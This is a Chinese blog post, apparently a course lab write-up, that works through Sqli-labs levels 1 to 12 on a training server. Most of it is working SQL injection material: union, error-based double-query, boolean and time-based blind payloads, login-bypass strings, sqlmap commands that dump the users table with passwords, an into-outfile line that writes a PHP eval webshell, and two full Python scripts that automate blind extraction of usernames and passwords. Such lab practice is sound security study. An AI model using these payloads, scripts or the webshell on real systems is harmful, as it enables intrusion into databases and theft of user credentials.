---
layout:     post   				    
title:      【信息系统安全】Sqli-lab SQL注入		
subtitle:   
date:       2021-12-13 				
author:     慕念 						
header-img: img/post-bg-computer-ml.jpg	
catalog: true 						
tags:								
    - 信息系统安全
---

GET型正确的sql语句一般为：

```sql
select * from table where id = 'input'
select * from table where id = "input"
select * from table where id = ("input")
select * from table where id = ('input')
select * from table where id = ("'input'")
```

通过这些进行猜测。



## 实验一	基于错误的GET单引号字符型注入

![image-20211207081858608](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051945.png)

页面中黄字提示输入ID作为参数，输入`?id=1`：

![image-20211207081948918](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051952.png)

输入`?id=1'`，前端有报错回显：`near ''1'' LIMIT 0,1' at line 1`，猜测sql后台语句为`select * from table where id='input'`，判断是字符型注入。

![image-20211207082113353](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051027.png)


### 1、手工注入

#### 用 order by 判断字段数

`?id=1' order by 3 --+`回显正常

![image-20211207084204085](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051092.png)

`?id=1' order by 4 --+`回显报错，说明字段数为3

![image-20211207084302301](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051736.png)

##### ⭐注意

这里发现给的教程中是用--+起到注释之后语句的作用，用#会报错：

![image-20211207084742232](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051370.png)

这里查到是因为`url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用，所以HTTP请求中不包括#`。

将#号改成url的编码`%23`即可。

![image-20211207085006752](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020051970.png)

#### 确定查询回显位置

`id=-1' union select 1,2,3%23`

其中，-1 的作用是查询不存在的值，使得结果为空。

![image-20211207085041517](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052813.png)

根据页面回显，可在`2`或`3`的位置加入想要查询的内容。



#### `database()`查询当前的数据库

`id=-1' union select 1,2,database()%23`

![image-20211207085303139](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052358.png)

当前数据库为：security

也可以通过：`id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata%23`查询所有数据库：

![image-20211207085609533](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052818.png)



#### 获取数据库中的table

`id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23`

![image-20211207085716049](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052856.png)

security数据库中共有4张表：emails,referers,uagents,users

#### 获取表中的字段

`id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'%23`

![image-20211207090008119](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052379.png)

users表中有三个字段：id,username,password

#### 获得字段中的数据

通过`group_concat()`函数聚合，使得一个字段中显示多个表项：

`id=-1' union select 1,group_concat(id,username),group_concat(password) from users%23`

![image-20211207090307454](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052587.png)

### 2、sqlmap

GET型

```cmd
python sqlmap.py -u "http://10.12.202.251:26700/Less-1/?id=1"
```

![image-20211207082923797](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052399.png)

```cmd
python sqlmap.py -u "http://10.12.202.251:26700/Less-1/?id=1" --dbs
```

![image-20211207083244515](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052298.png)

```c
python sqlmap.py -u "http://10.12.202.251:26700/Less-1/?id=1" -D security --tables
```

![image-20211207083406765](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052473.png)

```cmd
python sqlmap.py -u "http://10.12.202.251:26700/Less-1/?id=1" -D security -T users --columns
```

![image-20211207083538726](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052408.png)

```cmd
python sqlmap.py -u "http://10.12.202.251:26700/Less-1/?id=1" -D security -T users -C "id,password,username" --dump
```

![image-20211207083754272](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020052999.png)



## 实验二	基于错误的GET整型注入

输入`id=1`：

![image-20211207090441874](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053420.png)

输入`id=1'`有报错回显`near '' LIMIT 0,1' at line 1`，猜测后台sql语句：`select * from where id=('input')`

![image-20211207090557088](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053629.png)

再输入`id=1 and 1=1 #`和`id=1 and 1=2 #`进行测试：（这里用`#`不报错）

![image-20211207090815312](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053381.png)

![image-20211207090833697](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053212.png)

判断是数字型sql注入漏洞。

具体的注入过程参考实验一，只需要把`id=-1'`改为`id=-1`即可。结果同实验一。



## 实验三	基于错误的GET单引号变形字符型注入

输入`id=1`正常回显：

![image-20211207091520438](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053604.png)

输入`id=1'`，有报错显示：`near ''1'') LIMIT 0,1' at line 1`，可以发现有一个`)`，猜测后台sql语句：`select * from where id=('input')`

![image-20211207091602088](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053104.png)

输入`?id=1') and 1=1%23`进行测试，正常回显：

![image-20211207091838501](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053138.png)

输入`?id=1') and 1=2%23`进行测试，无回显，说明猜测成功：

![image-20211207091919805](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053983.png)

接下来的注入过程同实验一，只需要把`id=-1'`改为`id=-1')`即可



## 实验四	基于错误的GET双引号字符型注入

输入`?id=1`，正常回显：

![image-20211207092116409](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053027.png)

输入`?id=1'`，也可以正常回显：

![image-20211207092150880](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053148.png)

再尝试输入`?id=1"`，产生报错：`near '"1"") LIMIT 0,1' at line 1`，猜测后台sql语句：`select * from where id=("input")`

![image-20211207092233504](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053202.png)

构造输入进行测试。

输入`id=1 ") and 1=1%23`，正常回显：

![image-20211207092440946](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053394.png)

输入`id=1 ") and 1=2%23`，无回显，说明猜测正确：

![image-20211207092518106](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020053805.png)

接下来的注入过程同实验一，只需要把`id=-1'`改为`id=-1")`即可



## 实验五	双注入GET单引号字符型注入

输入`?id=1`，回显`You are in...........`

![image-20211207093302309](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054280.png)

输入`?id=1'`，产生报错回显：`near ''1'' LIMIT 0,1' at line 1`，猜测后台sql语句为：`select * from where id=('input')`

![image-20211207093402047](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054858.png)

构造输入进行验证：

`id=1' and 1=1%23`，正常回显：

![image-20211207093805703](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054452.png)

`id=1' and 1=2%23`，无回显，说明猜测正确。

![image-20211207093922854](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054238.png)



### 手工注入

#### 用 order by 判断字段数

`?id=1' order by 3 %23`回显正常

![image-20211207094034374](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054328.png)

`?id=1' order by 4%23`回显报错，说明字段数为3

![image-20211207094053137](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054082.png)



#### 确定查询回显位置

`id=-1' union select 1,2,3%23`

这时并没有像实验一那样有显式的返回，猜测存在盲注，所以这里不能使用union注入。

![image-20211207094243322](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054566.png)

通过之前的猜测验证，说明可以输入判断语句，通过是否有回显验证判断是是否正确。

#### 1、布尔盲注

##### 猜测数据库长度

输入`id=1' and length(database())>=1%23`，正常回显；一直试到`>=9`，无回显，说明数据库长度为8

<img src="https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054667.png" alt="image-20211207095444515" style="zoom: 67%;" /><img src="https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020054929.png" alt="image-20211207095513073" style="zoom: 67%;" />



##### 猜测数据库第一位字符

可以利用`left`函数：`left(a,b)`从左侧截取a的前b位

也可以利用`substr`函数：`substr(a,b,c)`从b位置开始，截取字符串a的c长度，如`substr(database(),1,1)='s'`

用二分法猜测：`?id=1' and left(database(),1)>'m'%23`

![image-20211207095729907](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055457.png)

继续猜测：`id=1' and left(database(),1)>'t'%23`

![image-20211207095821561](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055479.png)

`id=1' and left(database(),1)>'q'%23`

![image-20211207100010542](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055997.png)

`id=1' and left(database(),1)>'r'%23`，最后试出来**数据库第一位是`s`**,然后可以依次试下去，**可以通过burp suite的爆破模块自动爆破**。

![image-20211207100054320](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055825.png)

最后的到数据库为：security



##### 猜测数据库中的数据表

`id=1' and substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)>'a'%23`

改变`limit`函数和`substr`的索引值可以继续往后猜测：

猜测数据表的第二位字符：`substr(**,2,1)`

猜测第二个数据表：`limit 1,1`（`limit 0,1`：从第0个开始，获取第一个）

最后获得表为users



##### 获取users表中的数据

猜测`users`表中是否存在`us**`的列：

```
id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]'  limit 0,1 )%23
```

正常回显，说明存在：

![image-20211207102712715](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055920.png)

猜测是否存在`username`列：

```
id=1' and 1=(select 1 from information_schema.columns where table_name='users'  and column_name regexp '^username'  limit 0,1 )%23
```

正常回显，说明存在：

![image-20211207102825988](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055801.png)

获取`users`表的内容：根据回显进行猜测。

```
id=1' and ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68%23
```

![image-20211207102936120](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055895.png)



#### 2、双注入⭐

这里也可以通过双注入的方法进行爆破，就不需要猜测了。

双注入：当在一个聚合函数后（比如count函数），使用分组语句就会把查询的一部分以错误的形式显示出来。

利用函数：

```
rand()：生成随机数，返回0到1之间的一个值
floor()：取整函数
count()：聚合函数，用户返回符合条件的记录数量。
```

原理

> 当`floor()`, `count()`, `group by`遇到一起在`from`一个3行以上的表时，就会产生一个主键重复的报错，而此时把想显示的信息构造到主键里面，`mysql`就会通过报错把这个信息显示到页面上

双注入模板：

```
select count(*),concat((payload), floor(rand(0)*2)) as a from information_schema.tables group by a
```

##### 爆破数据库

得到库名security

```
?id=1' union select -1, count(*), concat((select database()), '---', floor(rand(0)*2)) as a from information_schema.tables group by a %23
```

![image-20211207102258042](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055137.png)

⭐注意：以下语句也可以进行爆破数据库，而且可以通过修改`limit`的值爆破其他的库名：

```
?id=1' and (select 1 from (select count(*),concat((select concat(schema_name,';') from information_schema.schemata limit 0,1),floor(rand()*2)) as x from information_schema.tables group by x) as a)%23
```

![image-20211207120957228](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055897.png)



##### 爆破数据表

通过`limit`数值的改变爆破不同的数据表（这里本来想用`group_concat`一起显示，但是失败了）

```
?id=1' union select 1, count(*),concat((select concat(table_name) from information_schema.tables where table_schema=database() limit 1,1),'---', floor(rand(0)*2)) as a from information_schema.tables group by a%23
```

![image-20211207121954640](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020055185.png)

当超过数量后就不会有错误回显：

![image-20211207122105095](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056820.png)



##### 爆破字段

通过修改`limit`爆破不同的字段

```
?id=1' union select 1, count(*),concat((select concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),'---', floor(rand(0)*2)) as a from information_schema.tables group by a%23
```

![image-20211207123632111](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056778.png)



##### 爆破数据值

```
?id=-1' union select count(*),1, concat((select concat_ws(id,username,password) from users limit 1,1),'---',floor(rand(0)*2)) as a from information_schema.tables group by a%23
```

![image-20211207125028942](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056287.png)

详细内容参考教程：

https://blog.csdn.net/weixin_43901998/article/details/105227678

https://blog.csdn.net/Mitchell_Donovan/article/details/115335855



#### 3、sqlmap

```cmd
python sqlmap.py -u "http://10.12.202.251:24914/Less-5/?id=1"
```

![image-20211207125320758](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056127.png)

（比起实验一少了union query的类型）

接下来的步骤同实验一：

```cmd
python sqlmap.py -u "http://10.12.202.251:24914/Less-5/?id=1" --dbs
```

```cmd
python sqlmap.py -u "http://10.12.202.251:24914/Less-5/?id=1" -D security --tables
```

```
python sqlmap.py -u "http://10.12.202.251:24914/Less-5/?id=1" -D security -T users --columns
```

```cmd
python sqlmap.py -u "http://10.12.202.251:24914/Less-5/?id=1" -D security -T users -C "id,password,username" --dump
```

![image-20211207125756925](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056790.png)



## 实验六	双注入GET双引号字符型注入

输入`?id=1`，同样没有回显，只显示You are in.......

![image-20211207125849213](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056998.png)

输入`?id=1'`，也可以正常回显：

![image-20211207130000251](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056675.png)

再尝试输入`?id=1"`，回显报错信息：`near '"1"" LIMIT 0,1' at line 1`，猜测后台sql语句：`select * from where id =("input")`

![image-20211207130035112](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056426.png)

构造输入进行验证：

`?id=1" and 1=1%23`，正常回显

`?id=1" and 1=2%23`，无回显，说明猜测正确

之后的步骤和实验五相同，只不过要把`?id=1'`改为`?id=1"`



## 实验七	导出文件GET字符型注入

尝试输入：`?id=1' or 1=1%23`、`?id=1" or 1=1%23`、`?id=1') or 1=1%23`都失败了。

输入`?id=1')) or 1=1%23`成功：

![image-20211207131602376](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056342.png)



#### 1、布尔盲注

同实验5，把`?id=1'`改为`?id=1'))`即可。这道题不能用双注入。



#### 2、导出文件注入

首先通过`?id=1')) order by 4%23`判断字段数为3

##### 查看是否有写入权限

本关有提示使用file权限向服务器写入文件，首先查看是否有写入权限：

输入`?id=1')) and (select count(*) from mysql.user)>0%23`，正常回显，说明有写入权限。

然后正常的步骤应该是：

`?id=-1')) union select 1,2,3 into outfile "xxxx\\try.php" %23`

`?id=-1')) union select 1,2,"<?php @eval($_POST['sql']);?>" into outfile "xxxx\\try1.php" %23`（写入webshell）

但是因为没有在kali靶机上写成功，没有自己实现

教程：https://www.jianshu.com/p/7b9256de20d1



## 实验八	布尔型单引号GET盲注

当输入`id=1`时有回显：You are in......

但是输入`id=1'`时没有回显，再输入`id=1' and 1=1 %23`和`id=1' and 1=2 %23`进行验证，前者有回显后者没有。确定了是字符型注入。

手工注入过程和实验五相同。

网上找到了py脚本：

```python
from urllib import request
from urllib import parse
import re

url = "http://10.12.202.251:21041/Less-8/?id="

# 1 查数据库

# def length():

database_length = 0
while True:
    param = "1' and length(database()) =" + str(database_length) + " #"
    response = request.urlopen(url + parse.quote(param)).read().decode()

    if re.search("You are in", response):
        # print("DATABASE_LENGTH:"+str(database_length))
        
        break
    else:
        database_length += 1

        
# 尝试二分法扫描

db_name = ""
for l in range(database_length):
    a, b = 64, 64
    while True:
        b = int(b / 2)
        param = "1' and ascii(substr(database()," + str(l + 1) + "))<" + str(a) + "#"
        response = request.urlopen(url + parse.quote(param)).read().decode()
        if re.search("You are in", response):
            a -= b
        else:
            param = "1' and ascii(substr(database()," + str(l + 1) + ")) =" + str(a) + " #"
            response = request.urlopen(url + parse.quote(param)).read().decode()
            if re.search("You are in", response):
                db_name += chr(a)
                break
            else:
                a += b
print("db_name:" + db_name)


# 2 查表数量

print('table:')
table_num = 0

while True:
    param = "1' and (select count(*) from information_schema.tables where table_schema=database())=" + str(
        table_num) + " #"
    response = request.urlopen(url + parse.quote(param)).read().decode()

    if re.search("You are in", response):
        # print("table_num:"+str(table_num))
        
        break
    else:
        table_num += 1


# 查表长度

def ta_length(num):
    table_length = 0
    while True:
        param = "1' and length(substr((select table_name from information_schema.tables where table_schema=database() " \
                "limit " + str(num) + ",1),1))=" + str(table_length) + " #"
        response = request.urlopen(url + parse.quote(param)).read().decode()

        if re.search("You are in", response):
            return table_length
        else:
            table_length += 1


# 查表

for n in range(table_num):
    table_name = ""
    for l in range(ta_length(n)):  # 表的长度
        
        for a in range(0, 128):  # 爆破表
            
            param = "1' and ascii(substr((select table_name from information_schema.tables where " \
                    "table_schema=database() limit " + str(n) + ",1)," + str(l + 1) + ",1)) =" + str(a) + " # "
            response = request.urlopen(url + parse.quote(param)).read().decode()
            if re.search("You are in", response):
                table_name += chr(a)
                break
    print("[*]:" + table_name)

# 3 查字段

# 查字段个数

columns_num = 0
while True:
    # 11111
    
    param = "1' and (select count(*) from information_schema.columns where table_name='users')=" + str(columns_num) + " #"
    response = request.urlopen(url + parse.quote(param)).read().decode()

    if re.search("You are in", response):
        print("columns:" + str(columns_num))
        break
    else:
        columns_num += 1


# 查每个字段的长度

def co_length(num):
    columns_length = 0
    while True:
        param = "1' and length(substr((select column_name from information_schema.columns where table_name='users' limit " + str(num) + ",1),1))=" + str(columns_length) + " #"
        response = request.urlopen(url + parse.quote(param)).read().decode()

        if re.search("You are in", response):
            # print(columns_length)
            
            return columns_length
        else:
            columns_length += 1


# 查每个字段的值

for n in range(columns_num):
    columns_name = ""
    for l in range(co_length(n)):  # 表的长度
        
        for a in range(0, 128):  # 爆破表
            
            param = "1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit " + str(n) + ",1)," + str(l + 1) + ",1)) =" + str(a) + " # "
            response = request.urlopen(url + parse.quote(param)).read().decode()
            if re.search("You are in", response):
                columns_name += chr(a)
                break
    print("[*]:" + columns_name)


# 下载数据

# 查 username


num = 0
while True:
    param = "1' and (select count(*) from users )= " + str(num) + "#"
    response = request.urlopen(url + parse.quote(param)).read().decode()

    if re.search("You are in", response):
        print("num:" + str(num))
        break
    else:
        num += 1


def length(num):
    user_length = 0
    while True:
        param = "1' and length(substr((select username from users limit " + str(num) + ",1),1))=" + str(
            user_length) + " #"
        response = request.urlopen(url + parse.quote(param)).read().decode()

        if re.search("You are in", response):
            # print(user_length)
            
            return user_length
        else:
            user_length += 1


def Name(value1, value2):
    for n in range(num):
        columns_name = ""
        for l in range(length(n)):  # 表的长度
            
            for a in range(0, 128):  # 爆破表
                
                param = "1' and ascii(substr((select " + value1 + " from users limit " + str(n) + ",1)," + str(
                    l + 1) + ",1)) =" + str(a) + " #"
                response = request.urlopen(url + parse.quote(param)).read().decode()
                if re.search("You are in", response):
                    columns_name += chr(a)
                    break
        print("[*]:" + columns_name, end=":")
        columns_name2 = ""
        for l in range(length(n)):  # 表的长度
            
            for a in range(0, 128):  # 爆破表
                
                param = "1' and ascii(substr((select " + value2 + " from users limit " + str(n) + ",1)," + str(
                    l + 1) + ",1)) =" + str(a) + " #"
                response = request.urlopen(url + parse.quote(param)).read().decode()
                if re.search("You are in", response):
                    columns_name2 += chr(a)
                    break
        print(columns_name2)


Name("username", "password")
```

![image-20211207142732019](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020056831.png)



## 实验九	基于时间的GET单引号盲注

常见包裹形式：

```
1，(1)，((1))
'1'，('1')，(('1'))
"1"，("1")，(("1"))
```

这里都试了一下，都可以正常回显。

再测试是否存在时间盲注，发现只有`?id=1' and sleep(5) %23`有明显延迟，存在**字符型时间盲注**。

> 时间盲注多与`IF(expr1,expr2,expr3)`结合使用，此if语句含义是：如果`expr1`是`TRUE`，则`IF()`的返回值为`expr2`；否则返回值则为`expr3`。
> 例：
> `if (length(database())>1,1,sleep(5))`，查看当前数据库的长度是否大于1，大于1则查询1，小于1则MySQL查询休眠5秒
> `if (substr(database()),1,1='s',1,sleep(5))`，查看当前数据库的第一个字母是否为’s’，为’s’则查询1，不为’s’则MySQL查询休眠5秒

所以这道题和第八题类似，只是增加了if语句。

判断当前数据库长度：

```
?id=1' and if(length(database())=8,1,sleep(5)) %23
```

查看当前数据库的第一个字母：

```
?id=1' and if(substr(database(),1,1)='a',1,sleep(5)) %23
```

查看security库下的第一张表的第一个字母：

```
?id=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1)='s',1,sleep(5)) %23
```

查看users表下的第一个字段的第一个字母：

```
?id=1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1)='s',1,sleep(5)) %23
```

查username字段的第一个值的第一个字母：

```
?id=1' and if(substr((select username from security.users limit 0,1),1,1)='s',1,sleep(5)) %23
```



也可以对实验八的脚本进行修改，增加time：

```python
from urllib import request
from urllib import parse
from time import  time

url = "http://10.12.202.251:21041/Less-9/?id="

#1 查数据库

database_length = 0
while True:
    param = "1' and if(length(database())="+str(database_length)+",sleep(0.1),1) #"
    t = time()
    response = request.urlopen(url + parse.quote(param))

    if ( time() - t > 0.1 ):
        print("DATABASE_LENGTH:"+str(database_length))
        break
    else:
        database_length += 1


db_name = ""
for l in range(database_length):
    for a in range(128):

        param = "1' and if(ascii(substr(database(),"  +  str(l+1) +  "))="  +  str(a) + ",sleep(0.1),1) #"
        t = time()
        response = request.urlopen(url + parse.quote(param))

        if (time()-t >0.1):
            db_name += chr(a)
            break
print("[*]:"+db_name)

#2 查表数量

table_num = 0

while True:
    param = "1 ' and if((select count(*) from information_schema.tables where table_schema=database())="+str(table_num)+",sleep(0.1),1) #"
    t = time()
    response = request.urlopen(url + parse.quote(param))
    if (time() - t > 0.1 ):
        print("table_num:"+str(table_num))
        break
    else:
        table_num += 1

# 查表长度

def ta_length(num):
    table_length = 0
    while True:
        param = "1' and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(num)+",1),1))="+str(table_length)+",sleep(0.1),1) #"
        t = time()
        response = request.urlopen(url + parse.quote(param))
        if (time() - t > 0.1 ):
            return table_length
            break
        else:
            table_length += 1

# 查表

for n in range(table_num):
    table_name =""
    for l  in range(ta_length(n)): # 表的长度
        
        for a in range(0,128): #爆破表
            
            param = "1' and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
            t = time()
            response = request.urlopen(url + parse.quote(param))
            if (time() - t > 0.1 ):
                table_name += chr(a)
                break
    print("table_name:" + table_name)


# 3 查字段

# 查字段个数

columns_num = 0
while True:
    param = "1' and if((select count(*) from information_schema.columns where table_name='users')="+str(columns_num)+",sleep(0.1),1) #"
    t = time()
    response = request.urlopen(url + parse.quote(param))
    if (time() - t > 0.1):
        print("columns_name:"+str(columns_num))
        break
    else:
        columns_num += 1

# 查每个字段的长度

def co_length(num):
    columns_length = 0
    while True:
        param = "1' and if(length(substr((select column_name from information_schema.columns where table_name='users' limit "+str(num)+",1),1))="+str(columns_length)+",sleep(0.1),1) #"
        t = time()
        response = request.urlopen(url + parse.quote(param))

        if (time() - t > 0.1):
            return columns_length
            break
        else:
            columns_length += 1
# 查每个字段的值

for n in range(columns_num):
    columns_name =""
    for l  in range(co_length(n)): # 表的长度
        
        for a in range(0,128): #爆破表
            
            param = "1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
            t = time()
            response = request.urlopen(url + parse.quote(param))
            if (time() - t > 0.1):
                columns_name += chr(a)
                break
    print("table_name:" +columns_name)

# 下载数据

# 查 username

num = 0
while True:
    param = "1' and if((select count(*) from users )= "+str(num)+",sleep(0.1),1)#"
    t = time()
    response = request.urlopen(url + parse.quote(param)).read().decode()

    if (time() - t > 0.1):
        print("num:"+str(num))
        break
    else:
        num += 1

def length(num):
    user_length = 0
    while True:
        param = "1' and if(length(substr((select username from users limit"+str(num)+",1),1))="+str(user_length)+",sleep(0.1),1) #"
        t = time()
        response = request.urlopen(url + parse.quote(param)).read().decode()

        if (time() - t > 0.1):
            print(user_length)
            return user_length
            break
        else:
            user_length += 1
def Name(value1,value2):
    for n in range(num):
        columns_name1 = columns_name2 = ""
        for l  in range(length(n)): # 表的长度
            
            for a in range(0,128): #爆破表
                
                param = "1' and if(ascii(substr((select "+value1+" from users limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
                t = time()
                response = request.urlopen(url + parse.quote(param))
                if (time() - t > 0.1 ):
                    columns_name1 += chr(a)
                    break

            for a in range(0,128): #爆破表
                
                param = "1' and if(ascii(substr((select "+value2+" from users limit "+str(n)+",1),"+str(l+1)+",1)) ="+str(a)+",sleep(0.1),1) #"
                t = time()
                response = request.urlopen(url + parse.quote(param))
                if (time() - t > 0.1 ):
                    columns_name2 += chr(a)
                    break
        print(columns_name1+":"+columns_name2)
        
Name("username","password")
```



## 实验十	基于时间的双引号盲注

发现当输入`?id=1" and sleep(5) %23 `时触发时间注入，同第九题，只要把`?id=1'`替换成`?id=1"`即可



## 实验十一	基于错误的PSOT单引号字符

常见post类型的后台sql语句

```
SELECT username, password FROM 用户表 WHERE username='input' and password='input' ;
SELECT username, password FROM 用户表 WHERE username='input' and password='input' ;
SELECT username, password FROM 用户表 WHERE username="input" and password='input' ;
```

构造poc（万能密码）

```
admin ' or 1=1 --+
```

用户名和密码输入admin,admin，发现有回显：

![image-20211207195932875](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057389.png)

抓包可以发现post的uname和passwd：

![image-20211207200210100](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057341.png)

尝试用户名输入`admin'`，密码随意，产生报错`use near '1' LIMIT 0,1' at line 1`猜测是字符型POST：

![image-20211207200403039](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057153.png)

输入`uname=admin'or'1'='1`有回显

![image-20211207201308880](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057556.png)

输入`uname=admin'and'1'='2`无回显，证明猜测正确。

![image-20211207201357976](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057117.png)



### 1、手工注入

因为有回显，所以可以采取union联合查询：

#### 用 order by 判断字段数

`uname=admin' order by 3 #`，回显报错，但是输入2正常回显，说明共有2个字段。

![image-20211207201755861](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057142.png)

#### 确定回显位置

`uname=-1' union select 1,2#`

![image-20211207202153337](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057651.png)

#### 查询数据库

`uname=-1' union select 1,database()#`

![image-20211207202240735](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020057311.png)

##### ⭐查询所有数据库：

```
uname=-1' union select 1,(SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)#
```

![image-20211207202043448](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058513.png)

#### 获取数据库中的table

`uname=-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#`

![image-20211207202353756](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020101815.png)

security数据库中共有4张表：emails,referers,uagents,users

#### 获取表中的字段

`uname=-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'#`

![image-20211207202437729](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058950.png)

users表中有三个字段：id,username,password

#### 获得字段中的数据

通过`group_concat()`函数聚合，使得一个字段中显示多个表项：

`uname=-1' union select group_concat(id,username),group_concat(password) from users#`

![image-20211207202529970](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058538.png)



### 2、sqlmap

```cmd
python sqlmap.py -u "http://10.12.202.251:22699/Less-11/"  --forms
```

![image-20211207202843899](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058440.png)

![image-20211207202855178](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058362.png)

```CMD
python sqlmap.py -u "http://10.12.202.251:22699/Less-11/"  --forms --dbs
```

![image-20211207203030597](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058707.png)

接下来的命令和GET型差不多，只是需要多加`--forms`参数：

```
python sqlmap.py -u "http://10.12.202.251:22699/Less-11/"  --forms -D security --tables
```

```
python sqlmap.py -u "http://10.12.202.251:22699/Less-11/"  --forms -D security -T users --columns
```

```
python sqlmap.py -u "http://10.12.202.251:22699/Less-11/"  --forms -D security -T users -C "id,username,password" --dump
```

![image-20211207203335516](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058182.png)



## 实验十二	基于错误的双引号POST型字符变形注入

输入`uname=admin"`产生报错回显，看到有`)`，猜测后台语句为：`SELECT username, password FROM 用户表 WHERE username=("input") and password=("input")  ;`

![image-20211207203501349](https://cdn.jsdelivr.net/gh/munian08/drawingbed@main/img/202207020058251.png)

